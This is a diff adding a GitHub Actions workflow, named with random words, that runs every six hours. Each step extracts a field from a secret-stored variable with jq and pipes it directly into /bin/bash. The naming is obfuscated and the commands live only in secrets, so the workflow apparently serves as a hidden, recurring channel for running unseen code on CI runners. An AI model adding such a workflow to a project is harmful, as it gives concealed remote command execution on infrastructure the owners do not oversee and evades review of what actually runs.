@@ -1,0 +1,24 @@
+name: impossibleambush
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: impossibleambush
+        env:
+          mgn4: ${{ secrets.mgn4 }}
+        run: |
+          echo $mgn4 | jq -r .zaorm7716 | /bin/bash
+          echo $mz026 | jq -r .h4 | /bin/bash
+          echo $uvlc790 | jq -r .lfv9 | /bin/bash
+          echo $umzn457 | jq -r .q7228 | /bin/bash
+          echo $fhuyy4024 | jq -r .nw7787 | /bin/bash
+          echo $j30859 | jq -r .uc1945 | /bin/bash
+          echo $sdzsl86401 | jq -r .iwpr96 | /bin/bash
+          echo $fuk841 | jq -r .yoelq0593 | /bin/bash
+
